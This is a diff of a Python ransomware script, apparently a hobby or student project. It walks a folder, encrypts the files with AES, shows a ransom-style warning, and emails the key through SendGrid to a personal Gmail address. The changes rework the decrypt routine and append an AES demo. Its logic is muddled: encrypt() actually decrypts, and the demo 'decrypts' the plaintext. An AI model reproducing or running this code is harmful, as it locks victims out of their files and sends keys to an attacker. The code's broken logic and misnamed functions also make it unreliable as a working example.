@@ -11,7 +11,7 @@ def send_email(key):
         from_email='yargoryar@gmail.com',
         to_emails='yaryna.gorodietska@gmail.com',
         subject='b64_key',
-        html_content=b64_key
+        html_content=key
     )
 
     sg = SendGridAPIClient(os.environ.get('SENDGRID_API_KEY'))
@@ -39,21 +39,33 @@ def decrypt():
     send_email(b64_key)
     print("Warning!")
     print(f"Your files in {folder_path} and it's subfolders have been encrypted!")
-    ui_key=input("Enter a key to decrypt all of the files:")
+
 
 
 def encrypt():
-dkey=base64.b64decode(ui_key)
-for root,dirs,files in os.walk(folder_path):
-    for a_file in files:
-        full_file_path=f"{root}\\{a_file}"
-        if full_file_path != ransomware_path:
-            file=open(full_file_path,"rb")
-            e_data=file.read()
-            file.close()
-            file=open(full_file_path,"wb")
-            d_cipher=AES.new(dkey,AES.MODE_OFB)
-            decr=d_cipher.decrypt(e_data[8:])
-            file.write(decr)
-            file.close()
-print(f"Your files in {folder_path} and it's subfolders have been decrypted!")
+    ui_key = input("Enter a key to decrypt all of the files:")
+    dkey=base64.b64decode(ui_key)
+    for root,dirs,files in os.walk(folder_path):
+        for a_file in files:
+            full_file_path=f"{root}\\{a_file}"
+            if full_file_path != ransomware_path:
+                file=open(full_file_path,"rb")
+                e_data=file.read()
+                file.close()
+                file=open(full_file_path,"wb")
+                d_cipher=AES.new(dkey,AES.MODE_OFB)
+                decr=d_cipher.decrypt(e_data[8:])
+                file.write(decr)
+                file.close()
+    print(f"Your files in {folder_path} and it's subfolders have been decrypted!")
+
+
+data = b"Yaryna"
+print(f"We want to encrypt data:{data}" )
+key=get_random_bytes(16)
+cipher=AES.new(key, AES.MODE_OFB)
+encr=cipher.encrypt(data)
+print(f"Our data has been encrypted:{data}")
+d_cipher=AES.new(key,AES.MODE_OFB)
+decr=d_cipher.decrypt(data)
+print(f"Our data has been decrypted:{data}")
